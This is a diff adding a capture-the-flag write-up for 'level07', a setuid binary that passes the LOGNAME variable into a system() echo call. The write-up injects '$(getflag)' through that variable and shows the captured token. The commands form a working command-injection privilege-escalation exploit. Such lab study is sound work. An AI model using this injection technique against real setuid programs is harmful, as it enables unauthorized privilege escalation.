@@ -1,3 +1,26 @@
 solution level07:
 
--> 
+> ls -la
+-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
+ 
+we have an executable file, belonging to user flag07 (with the setuid control bit on)
+executing the program outputs "level07"
+
+-> we can use the tool ltrace to look up some of the code:
+> ltrace ./level07
+...
+getenv("LOGNAME")                                                            = "level07"
+asprintf(0xbffff714, 0x8048688, 0xbfffff57, 0xb7e5ee55, 0xb7fed280)          = 18
+system("/bin/echo level07 "level07
+...
+
+the program seems to get the value of the LOGNAME environment variable as a string (getenv("LOGNAME"))
+this string seems to be used later as the parameter of the shell command echo executed via the 'system()' function
+we know we can execute a command and print its output with `echo $(...)`
+
+-> we change the value of LOGNAME so that echo prints the output of the getflag command:
+> export LOGNAME='$(getflag)'
+
+> ./level07
+
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
